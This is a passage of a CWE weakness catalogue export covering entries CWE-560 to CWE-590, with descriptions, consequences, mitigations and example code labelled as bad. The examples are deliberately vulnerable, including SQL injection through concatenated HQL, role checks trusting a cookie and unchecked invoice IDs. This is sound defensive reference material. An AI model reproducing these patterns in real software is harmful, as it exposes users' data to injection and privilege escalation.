CWE CATEGORY: DEPRECATED: Often Misused: Arguments and Parameters,"This entry has been deprecated. It was originally used for organizing the Development View (CWE-699) and some other views, but it introduced unnecessary complexity and depth to the resulting tree.",无常见后果信息,无示范例子,无可能的缓解方案
CWE-560: Use of umask() with chmod-style Argument,The product calls umask() with an incorrect argument that is specified as if it is an argument to chmod().,"Scope: ConfidentialityIntegrityAccess Control, Impact: Technical Impact:Read Files or Directories; Modify Files or Directories; Bypass Protection Mechanism, Likelihood: ",无示范例子,"Phase:  ImplementationUse umask() with the correct argument.Phase:  TestingIf you suspect misuse of umask(), you can use grep to spot call instances of umask()."
CWE-561: Dead Code,"The product contains dead code, which can never be executed.","Scope: Other, Impact: Technical Impact:Quality DegradationDead code that results from code that can never be executed is an indication of problems with the source code that needs to be fixed and is an indication of poor quality., Likelihood: ; Scope: Other, Impact: Technical Impact:Reduce Maintainability, Likelihood: ","Example 1The condition for the second if statement is impossible to satisfy. It requires that the variables be non-null. However, on the only path where s can be assigned a non-null value, there is a return statement.(bad code)Example Language:C++String s = null;if (b) {s = ""Yes"";return;}if (s != null) {Dead();}Example 2In the following class, two private methods call each other, but since neither one is ever invoked from anywhere else, they are both dead code.(bad code)Example Language:Javapublic class DoubleDead {private void doTweedledee() {doTweedledumb();}private void doTweedledumb() {doTweedledee();}public static void main(String[] args) {System.out.println(""running DoubleDead"");}}(In this case it is a good thing that the methods are dead: invoking either one would cause an infinite loop.)Example 3The field named glue is not used in the following class. The author of the class has accidentally put quotes around the field name, transforming it into a string constant.(bad code)Example Language:Javapublic class Dead {String glue;public String getGlue() {return ""glue"";}}",Phase:  ImplementationRemove dead code before deploying the application.Phase:  TestingUse a static analysis tool to spot dead code.
CWE-562: Return of Stack Variable Address,"A function returns the address of a stack variable, which will cause unintended program behavior, typically in the form of a crash.","Scope: AvailabilityIntegrityConfidentiality, Impact: Technical Impact:Read Memory; Modify Memory; Execute Unauthorized Code or Commands; DoS: Crash, Exit, or RestartIf the returned stack buffer address is dereferenced after the return, then an attacker may be able to modify or read memory, depending on how the address is used. If the address is used for reading, then the address itself may be exposed, or the contents that the address points to. If the address is used for writing, this can lead to a crash and possibly code execution., Likelihood: ",Example 1The following function returns a stack address.(bad code)Example Language:Cchar* getName() {char name[STR_MAX];fillInName(name);return name;},Phase:  TestingUse static analysis tools to spot return of the address of a stack variable.
CWE-563: Assignment to Variable without Use,"The variable's value is assigned but never used, making it a dead store.","Scope: Other, Impact: Technical Impact:Quality Degradation; Varies by ContextThis weakness could be an indication of a bug in the program or a deprecated variable that was not removed and is an indication of poor quality. This could lead to further bugs and the introduction of weaknesses., Likelihood: ",Example 1The following code excerpt assigns to the variable r and then overwrites the value without using it.(bad code)Example Language:Cr = getName();r = getNewBuffer(buf);,Phase:  ImplementationRemove unused variables from the code.
CWE-564: SQL Injection: Hibernate,Using Hibernate to execute a dynamic SQL statement built with user-controlled input can allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.,"Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Application Data; Modify Application Data, Likelihood: ","Example 1The following code excerpt uses Hibernate's HQL syntax to build a dynamic query that's vulnerable to SQL injection.(bad code)Example Language:JavaString street = getStreetFromUser();Query query = session.createQuery(""from Address a where a.street='"" + street + ""'"");","Phase:  RequirementsA non-SQL style database which is not subject to this flaw may be chosen.Phase:  Architecture and DesignFollow the principle of least privilege when creating user accounts to a SQL database. Users should only have the minimum privileges necessary to use their account. If the requirements of the system indicate that a user can read and modify their own data, then limit their privileges so they cannot read/write others' data.Phase:  Architecture and DesignFor any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoidCWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.Phase:  ImplementationImplement SQL strings using prepared statements that bind variables. Prepared statements that do not bind variables can be vulnerable to attack.Phase:  ImplementationUse vigorous allowlist style checking on any user input that may be used in a SQL command. Rather than escape meta-characters, it is safest to disallow them entirely. Reason: Later use of data that have been entered in the database may neglect to escape meta-characters before use. Narrowly define the set of safe characters based on the expected value of the parameter in the request."
CWE-565: Reliance on Cookies without Validation and Integrity Checking,"The product relies on the existence or values of cookies when performing security-critical operations, but it does not properly ensure that the setting is valid for the associated user.","Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume IdentityIt is dangerous to use cookies to set a user's privileges. The cookie can be manipulated to escalate an attacker's privileges to an administrative level., Likelihood: ","Example 1The following code excerpt reads a value from a browser cookie to determine the role of the user.(bad code)Example Language:JavaCookie[] cookies = request.getCookies();for (int i =0; i< cookies.length; i++) {Cookie c = cookies[i];if (c.getName().equals(""role"")) {userRole = c.getValue();}}It is easy for an attacker to modify the ""role"" value found in the locally stored cookie, allowing privilege escalation.","Phase:  Architecture and DesignAvoid using cookie data for a security-related decision.Phase:  ImplementationPerform thorough input validation (i.e.: server side validation) on the cookie data if you're going to use it for a security related decision.Phase:  Architecture and DesignAdd integrity checks to detect tampering.Phase:  Architecture and DesignProtect critical cookies from replay attacks, since cross-site scripting or other attacks may allow attackers to steal a strongly-encrypted cookie that also passes integrity checks. This mitigation applies to cookies that should only be valid during a single transaction or session. By enforcing timeouts, you may limit the scope of an attack. As part of your integrity check, use an unpredictable, server-side value that is not exposed to the client."
CWE-566: Authorization Bypass Through User-Controlled SQL Primary Key,"The product uses a database table that includes records that should not be accessible to an actor, but it executes a SQL statement with a primary key that can be controlled by that actor.","Scope: ConfidentialityIntegrityAccess Control, Impact: Technical Impact:Read Application Data; Modify Application Data; Bypass Protection Mechanism, Likelihood: ","Example 1The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier [1]. The identifier is selected from a list of all invoices associated with the current authenticated user.(bad code)Example Language:C#...conn = new SqlConnection(_ConnectionString);conn.Open();int16 id = System.Convert.ToInt16(invoiceID.Text);SqlCommand query = new SqlCommand( ""SELECT * FROM invoices WHERE id = @id"", conn);query.Parameters.AddWithValue(""@id"", id);SqlDataReader objReader = objCommand.ExecuteReader();...The problem is that the developer has not considered all of the possible values of id. Although the interface generates a list of invoice identifiers that belong to the current user, an attacker can bypass this interface to request any desired invoice. Because the code in this example does not check to ensure that the user has permission to access the requested invoice, it will display any invoice, even if it does not belong to the current user.","Phase:  ImplementationAssume all input is malicious. Use a standard input validation mechanism to validate all input for length, type, syntax, and business rules before accepting the data. Use an ""accept known good"" validation strategy.Phase:  ImplementationUse a parameterized query AND make sure that the accepted values conform to the business rules. Construct your SQL statement accordingly."
CWE-567: Unsynchronized Access to Shared Data in a Multithreaded Context,"The product does not properly synchronize shared data, such as static variables across threads, which can lead to undefined behavior and unpredictable data changes.","Scope: ConfidentialityIntegrityAvailability, Impact: Technical Impact:Read Application Data; Modify Application Data; DoS: Instability; DoS: Crash, Exit, or RestartIf the shared variable contains sensitive data, it may be manipulated or displayed in another user session. If this data is used to control the application, its value can be manipulated to cause the application to crash or perform poorly., Likelihood: ","Example 1The following code implements a basic counter for how many times the page has been accesed.(bad code)Example Language:Javapublic static class Counter extends HttpServlet {static int count = 0;protected void doGet(HttpServletRequest in, HttpServletResponse out)throws ServletException, IOException {out.setContentType(""text/plain"");PrintWriter p = out.getWriter();count++;p.println(count + "" hits so far!"");}}Consider when two separate threads, Thread A and Thread B, concurrently handle two different requests:Assume this is the first occurrence of doGet, so the value of count is 0.doGet() is called within Thread A.The execution of doGet() in Thread A continues to the point AFTER the value of the count variable is read, then incremented, but BEFORE it is saved back to count. At this stage, the incremented value is 1, but the value of count is 0.doGet() is called within Thread B, and due to a higher thread priority, Thread B progresses to the point where the count variable is accessed (where it is still 0), incremented, and saved. After the save, count is 1.Thread A continues. It saves the intermediate, incremented value to the count variable - but the incremented value is 1, so count is ""re-saved"" to 1.At this point, both Thread A and Thread B print that one hit has been seen, even though two separate requests have been processed. The value of count should be 2, not 1.While this example does not have any real serious implications, if the shared variable in question is used for resource tracking, then resource consumption could occur. Other scenarios exist.","Phase:  ImplementationRemove the use of static variables used between servlets. If this cannot be avoided, use synchronized access for these variables."
CWE-568: finalize() Method Without super.finalize(),The product contains a finalize() method that does not call super.finalize().,"Scope: Other, Impact: Technical Impact:Quality Degradation, Likelihood: ",Example 1The following method omits the call to super.finalize().(bad code)Example Language:Javaprotected void finalize() {discardNative();},Phase:  ImplementationCall the super.finalize() method.Phase:  TestingUse static analysis tools to spot such issues in your code.
CWE CATEGORY: Expression Issues,Weaknesses in this category are related to incorrectly written expressions within code.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-570: Expression is Always False,The product contains an expression that will always evaluate to false.,"Scope: Other, Impact: Technical Impact:Quality Degradation; Varies by Context, Likelihood: ","Example 1In the following Java example the updateUserAccountOrder() method used within an e-business product ordering/inventory application will validate the product number that was ordered and the user account number. If they are valid, the method will update the product inventory, the user account, and the user order appropriately.(bad code)Example Language:Javapublic void updateUserAccountOrder(String productNumber, String accountNumber) {boolean isValidProduct = false;boolean isValidAccount = false;if (validProductNumber(productNumber)) {isValidProduct = true;updateInventory(productNumber);}else {return;}if (validAccountNumber(accountNumber)) {isValidProduct = true;updateAccount(accountNumber, productNumber);}if (isValidProduct && isValidAccount) {updateAccountOrder(accountNumber, productNumber);}}However, the method never sets the isValidAccount variable after initializing it to false so the isValidProduct is mistakenly used twice. The result is that the expression ""isValidProduct && isValidAccount"" will always evaluate to false, so the updateAccountOrder() method will never be invoked. This will create serious problems with the product ordering application since the user account and inventory databases will be updated but the order will not be updated.This can be easily corrected by updating the appropriate variable.(good code)...if (validAccountNumber(accountNumber)) {isValidAccount = true;updateAccount(accountNumber, productNumber);}...Example 2In the following example, the hasReadWriteAccess method uses bit masks and bit operators to determine if a user has read and write privileges for a particular process. The variable mask is defined as a bit mask from the BIT_READ and BIT_WRITE constants that have been defined. The variable mask is used within the predicate of the hasReadWriteAccess method to determine if the userMask input parameter has the read and write bits set.(bad code)Example Language:C#define BIT_READ 0x0001 // 00000001#define BIT_WRITE 0x0010 // 00010000unsigned int mask = BIT_READ & BIT_WRITE; /* intended to use ""|"" */// using ""&"", mask = 00000000// using ""|"", mask = 00010001// determine if user has read and write accessint hasReadWriteAccess(unsigned int userMask) {// if the userMask has read and write bits set// then return 1 (true)if (userMask & mask) {return 1;}// otherwise return 0 (false)return 0;}However the bit operator used to initialize the mask variable is the AND operator rather than the intended OR operator (CWE-480), this resulted in the variable mask being set to 0. As a result, the if statement will always evaluate to false and never get executed.The use of bit masks, bit operators and bitwise operations on variables can be difficult. If possible, try to use frameworks or libraries that provide appropriate functionality and abstract the implementation.Example 3In the following example, the updateInventory method used within an e-business inventory application will update the inventory for a particular product. This method includes an if statement with an expression that will always evaluate to false. This is a common practice in C/C++ to introduce debugging statements quickly by simply changing the expression to evaluate to true and then removing those debugging statements by changing expression to evaluate to false. This is also a common practice for disabling features no longer needed.(bad code)Example Language:Cint updateInventory(char* productNumber, int numberOfItems) {int initCount = getProductCount(productNumber);int updatedCount = initCount + numberOfItems;int updated = updateProductCount(updatedCount);// if statement for debugging purposes onlyif (1 == 0) {char productName[128];productName = getProductName(productNumber);printf(""product %s initially has %d items in inventory \n"", productName, initCount);printf(""adding %d items to inventory for %s \n"", numberOfItems, productName);if (updated == 0) {printf(""Inventory updated for product %s to %d items \n"", productName, updatedCount);}else {printf(""Inventory not updated for product: %s \n"", productName);}}return updated;}Using this practice for introducing debugging statements or disabling features creates dead code that can cause problems during code maintenance and potentially introduce vulnerabilities. To avoid using expressions that evaluate to false for debugging purposes a logging API or debugging API should be used for the output of debugging messages.",Phase:  TestingUse Static Analysis tools to spot such conditions.
CWE-571: Expression is Always True,The product contains an expression that will always evaluate to true.,"Scope: Other, Impact: Technical Impact:Quality Degradation; Varies by Context, Likelihood: ","Example 1In the following Java example the updateInventory() method used within an e-business product ordering/inventory application will check if the input product number is in the store or in the warehouse. If the product is found, the method will update the store or warehouse database as well as the aggregate product database. If the product is not found, the method intends to do some special processing without updating any database.(bad code)Example Language:Javapublic void updateInventory(String productNumber) {boolean isProductAvailable = false;boolean isDelayed = false;if (productInStore(productNumber)) {isProductAvailable = true;updateInStoreDatabase(productNumber);}else if (productInWarehouse(productNumber)) {isProductAvailable = true;updateInWarehouseDatabase(productNumber);}else {isProductAvailable = true;}if ( isProductAvailable ) {updateProductDatabase(productNumber);}else if ( isDelayed ) {/* Warn customer about delay before order processing */...}}However, the method never sets the isDelayed variable and instead will always update the isProductAvailable variable to true. The result is that the predicate testing the isProductAvailable boolean will always evaluate to true and therefore always update the product database. Further, since the isDelayed variable is initialized to false and never changed, the expression always evaluates to false and the customer will never be warned of a delay on their product.",Phase:  TestingUse Static Analysis tools to spot such conditions.
CWE-572: Call to Thread run() instead of start(),"The product calls a thread's run() method instead of calling start(), which causes the code to run in the thread of the caller instead of the callee.","Scope: Other, Impact: Technical Impact:Quality Degradation; Varies by Context, Likelihood: ",Example 1The following excerpt from a Java program mistakenly calls run() instead of start().(bad code)Example Language:JavaThread thr = new Thread() {public void run() {...}};thr.run();,Phase:  ImplementationUse the start() method instead of the run() method.
CWE-573: Improper Following of Specification by Caller,"The product does not follow or incorrectly follows the specifications as required by the implementation language, environment, framework, protocol, or platform.","Scope: Other, Impact: Technical Impact:Quality Degradation; Varies by Context, Likelihood: ",无示范例子,无可能的缓解方案
CWE-574: EJB Bad Practices: Use of Synchronization Primitives,The product violates the Enterprise JavaBeans (EJB) specification by using thread synchronization primitives.,"Scope: Other, Impact: Technical Impact:Quality Degradation, Likelihood: ","Example 1In the following Java example a Customer Entity EJB provides access to customer information in a database for a business application.(bad code)Example Language:Java@Entitypublic class Customer implements Serializable {private String id;private String firstName;private String lastName;private Address address;public Customer() {...}public Customer(String id, String firstName, String lastName) {...}@Idpublic String getCustomerId() {...}public synchronized void setCustomerId(String id) {...}public String getFirstName() {...}public synchronized void setFirstName(String firstName) {...}public String getLastName() {...}public synchronized void setLastName(String lastName) {...}@OneToOne()public Address getAddress() {...}public synchronized void setAddress(Address address) {...}}However, the customer entity EJB uses the synchronized keyword for the set methods to attempt to provide thread safe synchronization for the member variables. The use of synchronized methods violate the restriction of the EJB specification against the use synchronization primitives within EJBs. Using synchronization primitives may cause inconsistent behavior of the EJB when used within different EJB containers.",Phase:  ImplementationDo not use Synchronization Primitives when writing EJBs.
CWE-575: EJB Bad Practices: Use of AWT Swing,The product violates the Enterprise JavaBeans (EJB) specification by using AWT/Swing.,"Scope: Other, Impact: Technical Impact:Quality Degradation, Likelihood: ","Example 1The following Java example is a simple converter class for converting US dollars to Yen. This converter class demonstrates the improper practice of using a stateless session Enterprise JavaBean that implements an AWT Component and AWT keyboard event listener to retrieve keyboard input from the user for the amount of the US dollars to convert to Yen.(bad code)Example Language:Java@Statelesspublic class ConverterSessionBean extends Component implements KeyListener, ConverterSessionRemote {/* member variables for receiving keyboard input using AWT API */...private StringBuffer enteredText = new StringBuffer();/* conversion rate on US dollars to Yen */private BigDecimal yenRate = new BigDecimal(""115.3100"");public ConverterSessionBean() {super();/* method calls for setting up AWT Component for receiving keyboard input */...addKeyListener(this);}public BigDecimal dollarToYen(BigDecimal dollars) {BigDecimal result = dollars.multiply(yenRate);return result.setScale(2, BigDecimal.ROUND_DOWN);}/* member functions for implementing AWT KeyListener interface */public void keyTyped(KeyEvent event) {...}public void keyPressed(KeyEvent e) {}public void keyReleased(KeyEvent e) {}/* member functions for receiving keyboard input and displaying output */public void paint(Graphics g) {...}...}This use of the AWT and Swing APIs within any kind of Enterprise JavaBean not only violates the restriction of the EJB specification against using AWT or Swing within an EJB but also violates the intended use of Enterprise JavaBeans to separate business logic from presentation logic.The Stateless Session Enterprise JavaBean should contain only business logic. Presentation logic should be provided by some other mechanism such as Servlets or Java Server Pages (JSP) as in the following Java/JSP example.(good code)Example Language:Java@Statelesspublic class ConverterSessionBean implements ConverterSessionRemoteInterface {/* conversion rate on US dollars to Yen */private BigDecimal yenRate = new BigDecimal(""115.3100"");public ConverterSessionBean() {}/* remote method to convert US dollars to Yen */public BigDecimal dollarToYen(BigDecimal dollars) {BigDecimal result = dollars.multiply(yenRate);return result.setScale(2, BigDecimal.ROUND_DOWN);}}(good code)Example Language:JSP<%@ page import=""converter.ejb.Converter, java.math.*, javax.naming.*""%><%!private Converter converter = null;public void jspInit() {try {InitialContext ic = new InitialContext();converter = (Converter) ic.lookup(Converter.class.getName());} catch (Exception ex) {System.out.println(""Couldn't create converter bean.""+ ex.getMessage());}}public void jspDestroy() {converter = null;}%><html><head><title>Converter</title></head><body bgcolor=""white""><h1>Converter</h1><hr><p>Enter an amount to convert:</p><form method=""get""><input type=""text"" name=""amount"" size=""25""><br><p><input type=""submit"" value=""Submit""><input type=""reset"" value=""Reset""></form><%String amount = request.getParameter(""amount"");if ( amount != null && amount.length() > 0 ) {BigDecimal d = new BigDecimal(amount);BigDecimal yenAmount = converter.dollarToYen(d);%><p><%= amount %> dollars are <%= yenAmount %> Yen.<p><%}%></body></html>",Phase:  Architecture and DesignDo not use AWT/Swing when writing EJBs.
CWE-576: EJB Bad Practices: Use of Java I/O,The product violates the Enterprise JavaBeans (EJB) specification by using the java.io package.,"Scope: Other, Impact: Technical Impact:Quality Degradation, Likelihood: ","Example 1The following Java example is a simple stateless Enterprise JavaBean that retrieves the interest rate for the number of points for a mortgage. In this example, the interest rates for various points are retrieved from an XML document on the local file system, and the EJB uses the Java I/O API to retrieve the XML document from the local file system.(bad code)Example Language:Java@Statelesspublic class InterestRateBean implements InterestRateRemote {private Document interestRateXMLDocument = null;private File interestRateFile = null;public InterestRateBean() {try {/* get XML document from the local filesystem */interestRateFile = new File(Constants.INTEREST_RATE_FILE);if (interestRateFile.exists()){DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();DocumentBuilder db = dbf.newDocumentBuilder();interestRateXMLDocument = db.parse(interestRateFile);}} catch (IOException ex) {...}}public BigDecimal getInterestRate(Integer points) {return getInterestRateFromXML(points);}/* member function to retrieve interest rate from XML document on the local file system */private BigDecimal getInterestRateFromXML(Integer points) {...}}This use of the Java I/O API within any kind of Enterprise JavaBean violates the EJB specification by using the java.io package for accessing files within the local filesystem.An Enterprise JavaBean should use a resource manager API for storing and accessing data. In the following example, the private member function getInterestRateFromXMLParser uses an XML parser API to retrieve the interest rates.(good code)Example Language:Java@Statelesspublic class InterestRateBean implements InterestRateRemote {public InterestRateBean() {}public BigDecimal getInterestRate(Integer points) {return getInterestRateFromXMLParser(points);}/* member function to retrieve interest rate from XML document using an XML parser API */private BigDecimal getInterestRateFromXMLParser(Integer points) {...}}",Phase:  ImplementationDo not use Java I/O when writing EJBs.
CWE-577: EJB Bad Practices: Use of Sockets,The product violates the Enterprise JavaBeans (EJB) specification by using sockets.,"Scope: Other, Impact: Technical Impact:Quality Degradation, Likelihood: ","Example 1The following Java example is a simple stateless Enterprise JavaBean that retrieves stock symbols and stock values. The Enterprise JavaBean creates a socket and listens for and accepts connections from clients on the socket.(bad code)Example Language:Java@Statelesspublic class StockSymbolBean implements StockSymbolRemote {ServerSocket serverSocket = null;Socket clientSocket = null;public StockSymbolBean() {try {serverSocket = new ServerSocket(Constants.SOCKET_PORT);} catch (IOException ex) {...}try {clientSocket = serverSocket.accept();} catch (IOException e) {...}}public String getStockSymbol(String name) {...}public BigDecimal getStockValue(String symbol) {...}private void processClientInputFromSocket() {...}}And the following Java example is similar to the previous example but demonstrates the use of multicast socket connections within an Enterprise JavaBean.(bad code)Example Language:Java@Statelesspublic class StockSymbolBean extends Thread implements StockSymbolRemote {ServerSocket serverSocket = null;Socket clientSocket = null;boolean listening = false;public StockSymbolBean() {try {serverSocket = new ServerSocket(Constants.SOCKET_PORT);} catch (IOException ex) {...}listening = true;while(listening) {start();}}public String getStockSymbol(String name) {...}public BigDecimal getStockValue(String symbol) {...}public void run() {try {clientSocket = serverSocket.accept();} catch (IOException e) {...}...}}The previous two examples within any type of Enterprise JavaBean violate the EJB specification by attempting to listen on a socket, accepting connections on a socket, or using a socket for multicast.",Phases:  Architecture and Design; ImplementationDo not use Sockets when writing EJBs.
CWE-578: EJB Bad Practices: Use of Class Loader,The product violates the Enterprise JavaBeans (EJB) specification by using the class loader.,"Scope: ConfidentialityIntegrityAvailabilityOther, Impact: Technical Impact:Execute Unauthorized Code or Commands; Varies by Context, Likelihood: ","Example 1The following Java example is a simple stateless Enterprise JavaBean that retrieves the interest rate for the number of points for a mortgage. The interest rates for various points are retrieved from an XML document on the local file system, and the EJB uses the Class Loader for the EJB class to obtain the XML document from the local file system as an input stream.(bad code)Example Language:Java@Statelesspublic class InterestRateBean implements InterestRateRemote {private Document interestRateXMLDocument = null;public InterestRateBean() {try {// get XML document from the local filesystem as an input stream// using the ClassLoader for this classClassLoader loader = this.getClass().getClassLoader();InputStream in = loader.getResourceAsStream(Constants.INTEREST_RATE_FILE);DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();DocumentBuilder db = dbf.newDocumentBuilder();interestRateXMLDocument = db.parse(interestRateFile);} catch (IOException ex) {...}}public BigDecimal getInterestRate(Integer points) {return getInterestRateFromXML(points);}/* member function to retrieve interest rate from XML document on the local file system */private BigDecimal getInterestRateFromXML(Integer points) {...}}This use of the Java Class Loader class within any kind of Enterprise JavaBean violates the restriction of the EJB specification against obtaining the current class loader as this could compromise the security of the application using the EJB.Example 2An EJB is also restricted from creating a custom class loader and creating a class and instance of a class from the class loader, as shown in the following example.(bad code)Example Language:Java@Statelesspublic class LoaderSessionBean implements LoaderSessionRemote {public LoaderSessionBean() {try {ClassLoader loader = new CustomClassLoader();Class c = loader.loadClass(""someClass"");Object obj = c.newInstance();/* perform some task that uses the new class instance member variables or functions */...} catch (Exception ex) {...}}public class CustomClassLoader extends ClassLoader {}}",Phases:  Architecture and Design; ImplementationDo not use the Class Loader when writing EJBs.
CWE-579: J2EE Bad Practices: Non-serializable Object Stored in Session,"The product stores a non-serializable object as an HttpSession attribute, which can hurt reliability.","Scope: Other, Impact: Technical Impact:Quality Degradation, Likelihood: ","Example 1The following class adds itself to the session, but because it is not serializable, the session can no longer be replicated.(bad code)Example Language:Javapublic class DataGlob {String globName;String globValue;public void addToSession(HttpSession session) {session.setAttribute(""glob"", this);}}","Phase:  ImplementationIn order for session replication to work, the values the product stores as attributes in the session must implement the Serializable interface."
CWE-580: clone() Method Without super.clone(),The product contains a clone() method that does not call super.clone() to obtain the new object.,"Scope: IntegrityOther, Impact: Technical Impact:Unexpected State; Quality Degradation, Likelihood: ","Example 1The following two classes demonstrate a bug introduced by not calling super.clone(). Because of the way Kibitzer implements clone(), FancyKibitzer's clone method will return an object of type Kibitzer instead of FancyKibitzer.(bad code)Example Language:Javapublic class Kibitzer {public Object clone() throws CloneNotSupportedException {Object returnMe = new Kibitzer();...}}public class FancyKibitzer extends Kibitzer{public Object clone() throws CloneNotSupportedException {Object returnMe = super.clone();...}}","Phase:  ImplementationCall super.clone() within your clone() method, when obtaining a new object.Phase:  ImplementationIn some cases, you can eliminate the clone method altogether and use copy constructors."
CWE-581: Object Model Violation: Just One of Equals and Hashcode Defined,The product does not maintain equal hashcodes for equal objects.,"Scope: IntegrityOther, Impact: Technical Impact:OtherIf this invariant is not upheld, it is likely to cause trouble if objects of this class are stored in a collection. If the objects of the class in question are used as a key in a Hashtable or if they are inserted into a Map or Set, it is critical that equal objects have equal hashcodes., Likelihood: ",无示范例子,Phase:  ImplementationBoth Equals() and Hashcode() should be defined.
"CWE-582: Array Declared Public, Final, and Static","The product declares an array public, final, and static, which is not sufficient to prevent the array's contents from being modified.","Scope: Integrity, Impact: Technical Impact:Modify Application Data, Likelihood: ","Example 1The following Java Applet code mistakenly declares an array public, final and static.(bad code)Example Language:Javapublic final class urlTool extends Applet {public final static URL[] urls;...}",Phase:  ImplementationIn most situations the array should be made private.
CWE-583: finalize() Method Declared Public,The product violates secure coding principles for mobile code by declaring a finalize() method public.,"Scope: ConfidentialityIntegrityAvailability, Impact: Technical Impact:Alter Execution Logic; Execute Unauthorized Code or Commands; Modify Application Data, Likelihood: ","Example 1The following Java Applet code mistakenly declares a public finalize() method.(bad code)Example Language:Javapublic final class urlTool extends Applet {public void finalize() {...}...}Mobile code, in this case a Java Applet, is code that is transmitted across a network and executed on a remote machine. Because mobile code developers have little if any control of the environment in which their code will execute, special security concerns become relevant. One of the biggest environmental threats results from the risk that the mobile code will run side-by-side with other, potentially malicious, mobile code. Because all of the popular web browsers execute code from multiple sources together in the same JVM, many of the security guidelines for mobile code are focused on preventing manipulation of your objects' state and behavior by adversaries who have access to the same virtual machine where your product is running.","Phase:  ImplementationIf you are using finalize() as it was designed, there is no reason to declare finalize() with anything other than protected access."
CWE-584: Return Inside Finally Block,"The code has a return statement inside a finally block, which will cause any thrown exception in the try block to be discarded.","Scope: Other, Impact: Technical Impact:Alter Execution Logic, Likelihood: ","Example 1In the following code excerpt, the IllegalArgumentException will never be delivered to the caller. The finally block will cause the exception to be discarded.(bad code)Example Language:Javatry {...throw IllegalArgumentException();}finally {return r;}","Phase:  ImplementationDo not use a return statement inside the finally block. The finally block should have ""cleanup"" code."
CWE-585: Empty Synchronized Block,The product contains an empty synchronized block.,"Scope: Other, Impact: Technical Impact:OtherAn empty synchronized block will wait until nobody else is using the synchronizer being specified. While this may be part of the desired behavior, because you haven't protected the subsequent code by placing it inside the synchronized block, nothing is stopping somebody else from modifying whatever it was you were waiting for while you run the subsequent code., Likelihood: ","Example 1The following code attempts to synchronize on an object, but does not execute anything in the synchronized block. This does not actually accomplish anything and may be a sign that a programmer is wrestling with synchronization but has not yet achieved the result they intend.(bad code)Example Language:Javasynchronized(this) { }Instead, in a correct usage, the synchronized statement should contain procedures that access or modify data that is exposed to multiple threads. For example, consider a scenario in which several threads are accessing student records at the same time. The method which sets the student ID to a new value will need to make sure that nobody else is accessing this data at the same time and will require synchronization.(good code)public void setID(int ID){synchronized(this){this.ID = ID;}}","Phase:  ImplementationWhen you come across an empty synchronized statement, or a synchronized statement in which the code has been commented out, try to determine what the original intentions were and whether or not the synchronized block is still necessary."
CWE-586: Explicit Call to Finalize(),The product makes an explicit call to the finalize() method from outside the finalizer.,"Scope: IntegrityOther, Impact: Technical Impact:Unexpected State; Quality Degradation, Likelihood: ",Example 1The following code fragment calls finalize() explicitly:(bad code)Example Language:Java// time to clean upwidget.finalize();,Phases:  Implementation; TestingDo not make explicit calls to finalize(). Use static analysis tools to spot such instances.
CWE-587: Assignment of a Fixed Address to a Pointer,The product sets a pointer to a specific address other than NULL or 0.,"Scope: IntegrityConfidentialityAvailability, Impact: Technical Impact:Execute Unauthorized Code or CommandsIf one executes code at a known location, an attacker might be able to inject code there beforehand., Likelihood: ; Scope: Availability, Impact: Technical Impact:DoS: Crash, Exit, or Restart; Reduce Maintainability; Reduce ReliabilityIf the code is ported to another platform or environment, the pointer is likely to be invalid and cause a crash., Likelihood: ; Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Memory; Modify MemoryThe data at a known pointer location can be easily read or influenced by an attacker., Likelihood: ","Example 1This code assumes a particular function will always be found at a particular address. It assigns a pointer to that address and calls the function.(bad code)Example Language:Cint (*pt2Function) (float, char, char)=0x08040000;int result2 = (*pt2Function) (12, 'a', 'b');// Here we can inject code to execute.The same function may not always be found at the same memory address. This could lead to a crash, or an attacker may alter the memory at the expected address, leading to arbitrary code execution.",Phase:  ImplementationNever set a pointer to a fixed address.
CWE-588: Attempt to Access Child of a Non-structure Pointer,Casting a non-structure type to a structure type and accessing a field can lead to memory access errors or data corruption.,"Scope: Integrity, Impact: Technical Impact:Modify MemoryAdjacent variables in memory may be corrupted by assignments performed on fields after the cast., Likelihood: ; Scope: Availability, Impact: Technical Impact:DoS: Crash, Exit, or RestartExecution may end due to a memory access error., Likelihood: ","Example 1The following example demonstrates the weakness.(bad code)Example Language:Cstruct foo{int i;}...int main(int argc, char **argv){*foo = (struct foo *)main;foo->i = 2;return foo->i;}",Phase:  RequirementsThe choice could be made to use a language that is not susceptible to these issues.Phase:  ImplementationReview of type casting operations can identify locations where incompatible types are cast.
CWE-589: Call to Non-ubiquitous API,The product uses an API function that does not exist on all versions of the target platform. This could cause portability problems or inconsistencies that allow denial of service or other consequences.,"Scope: Other, Impact: Technical Impact:Quality Degradation, Likelihood: ",无示范例子,Phase:  ImplementationAlways test your code on any platform on which it is targeted to run on.Phase:  TestingTest your code on the newest and oldest platform on which it is targeted to run on.Phase:  TestingDevelop a system to test for API functions that are not portable.
CWE-590: Free of Memory not on the Heap,"The product calls free() on a pointer to memory that was not allocated using associated heap allocation functions such as malloc(), calloc(), or realloc().","Scope: IntegrityConfidentialityAvailability, Impact: Technical Impact:Execute Unauthorized Code or Commands; Modify MemoryThere is the potential for arbitrary code execution with privileges of the vulnerable program via a ""write, what where"" primitive. If pointers to memory which hold user information are freed, a malicious user will be able to write 4 bytes anywhere in memory., Likelihood:","Example 1In this example, an array of record_t structs, bar, is allocated automatically on the stack as a local variable and the programmer attempts to call free() on the array. The consequences will vary based on the implementation of free(), but it will not succeed in deallocating the memory.(bad code)Example Language:Cvoid foo(){record_t bar[MAX_SIZE];/* do something interesting with bar */...free(bar);}This example shows the array allocated globally, as part of the data segment of memory and the programmer attempts to call free() on the array.(bad code)Example Language:Crecord_t bar[MAX_SIZE]; //Global varvoid foo(){/* do something interesting with bar */...free(bar);}Instead, if the programmer wanted to dynamically manage the memory, malloc() or calloc() should have been used.(good code)void foo(){record_t *bar = (record_t*)malloc(MAX_SIZE*sizeof(record_t));/* do something interesting with bar */...free(bar);}Additionally, you can pass global variables to free() when they are pointers to dynamically allocated memory.(good code)record_t *bar; //Global varvoid foo(){bar = (record_t*)malloc(MAX_SIZE*sizeof(record_t));/* do something 